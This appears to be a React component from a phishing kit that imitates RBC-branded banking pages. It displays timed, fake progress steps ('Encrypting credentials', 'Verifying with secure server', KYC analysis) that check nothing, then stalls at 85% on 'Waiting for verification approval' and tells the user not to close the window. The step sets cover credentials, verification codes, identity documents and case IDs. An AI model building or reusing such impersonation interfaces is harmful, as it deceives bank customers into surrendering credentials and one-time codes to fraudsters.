import { useEffect, useState } from 'react';
import { Loader2, CheckCircle2, Shield, Lock, UserCheck, FileCheck, Fingerprint } from 'lucide-react';

interface VerificationStep {
    id: number;
    label: string;
    icon: any;
}

interface RBCWaitingStateProps {
    message?: string;
    steps?: VerificationStep[];
}

// Default steps for generic verification
const defaultSteps: VerificationStep[] = [
    { id: 1, label: 'Securing your connection', icon: Lock },
    { id: 2, label: 'Processing your request', icon: Shield },
    { id: 3, label: 'Awaiting verification', icon: UserCheck },
];

// Predefined step sets for different pages
export const VERIFICATION_STEPS = {
    credentials: [
        { id: 1, label: 'Encrypting credentials', icon: Lock },
        { id: 2, label: 'Verifying with secure server', icon: Shield },
        { id: 3, label: 'Confirming identity', icon: UserCheck },
    ],
    secretKey: [
        { id: 1, label: 'Validating verification code', icon: FileCheck },
        { id: 2, label: 'Checking security protocols', icon: Shield },
        { id: 3, label: 'Confirming authentication', icon: UserCheck },
    ],
    kyc: [
        { id: 1, label: 'Uploading documents securely', icon: Lock },
        { id: 2, label: 'Analyzing identity information', icon: Fingerprint },
        { id: 3, label: 'Awaiting review', icon: UserCheck },
    ],
    caseId: [
        { id: 1, label: 'Validating case information', icon: FileCheck },
        { id: 2, label: 'Retrieving your session', icon: Shield },
        { id: 3, label: 'Preparing secure access', icon: Lock },
    ],
};

export function RBCWaitingState({
    message = 'Processing your request...',
    steps = defaultSteps
}: RBCWaitingStateProps) {
    const [currentStep, setCurrentStep] = useState(0);

    useEffect(() => {
        // Cycle through first two steps, then stay on the last one (awaiting approval)
        if (currentStep >= steps.length - 1) return;

        const timer = setTimeout(() => {
            setCurrentStep(prev => prev + 1);
        }, 1800); // Move to next step every 1.8 seconds

        return () => clearTimeout(timer);
    }, [currentStep, steps.length]);

    return (
        <div className="w-full flex flex-col items-center justify-center py-12">
            <div className="w-full max-w-md space-y-6">
                {/* Main message */}
                <div className="text-center">
                    <h3 className="text-lg font-medium text-[#1f1f1f] mb-2">{message}</h3>
                    <p className="text-sm text-[#666666] font-light">
                        Please wait while we securely process your information
                    </p>
                </div>

                {/* Progress steps */}
                <div className="space-y-3">
                    {steps.map((step, index) => {
                        const isCompleted = index < currentStep;
                        const isActive = index === currentStep;
                        const isPending = index > currentStep;
                        const Icon = step.icon;

                        return (
                            <div
                                key={step.id}
                                className={`flex items-center gap-3 p-3 rounded-lg transition-all duration-500 ${isActive ? 'bg-[#006ac3]/5 border border-[#006ac3]/20' :
                                    isCompleted ? 'bg-green-50/50 border border-green-200/50' :
                                        'bg-gray-50/50 border border-gray-200/50'
                                    }`}
                            >
                                <div className={`flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${isCompleted ? 'bg-green-500' :
                                    isActive ? 'bg-[#006ac3]' :
                                        'bg-gray-300'
                                    }`}>
                                    {isCompleted ? (
                                        <CheckCircle2 className="w-5 h-5 text-white" />
                                    ) : isActive ? (
                                        <Loader2 className="w-5 h-5 text-white animate-spin" />
                                    ) : (
                                        <Icon className="w-4 h-4 text-white opacity-60" />
                                    )}
                                </div>

                                <span className={`text-sm transition-all duration-500 ${isCompleted ? 'text-green-700 font-light' :
                                    isActive ? 'text-[#006ac3] font-normal' :
                                        'text-gray-400 font-light'
                                    }`}>
                                    {step.label}
                                    {isActive && index === steps.length - 1 && (
                                        <span className="ml-2 inline-flex gap-1">
                                            <span className="w-1.5 h-1.5 bg-[#006ac3] rounded-full animate-pulse" style={{ animationDelay: '0ms' }}></span>
                                            <span className="w-1.5 h-1.5 bg-[#006ac3] rounded-full animate-pulse" style={{ animationDelay: '150ms' }}></span>
                                            <span className="w-1.5 h-1.5 bg-[#006ac3] rounded-full animate-pulse" style={{ animationDelay: '300ms' }}></span>
                                        </span>
                                    )}
                                </span>
                            </div>
                        );
                    })}
                </div>

                {/* Indeterminate progress bar - pulses but doesn't fill to 100% */}
                <div className="w-full bg-gray-200 rounded-full h-1.5 overflow-hidden">
                    <div
                        className="h-full bg-[#006ac3] transition-all duration-1000 ease-in-out"
                        style={{
                            width: currentStep === steps.length - 1 ? '85%' : `${((currentStep + 1) / steps.length) * 85}%`
                        }}
                    />
                </div>

                {/* Additional info */}
                <div className="text-center space-y-1">
                    <p className="text-xs text-[#666666] font-light">
                        {currentStep === steps.length - 1
                            ? 'Waiting for verification approval...'
                            : 'This usually takes a few moments'
                        }
                    </p>
                    <p className="text-xs text-[#999999] font-light">
                        Please don't close this window
                    </p>
                </div>
            </div>
        </div>
    );
}
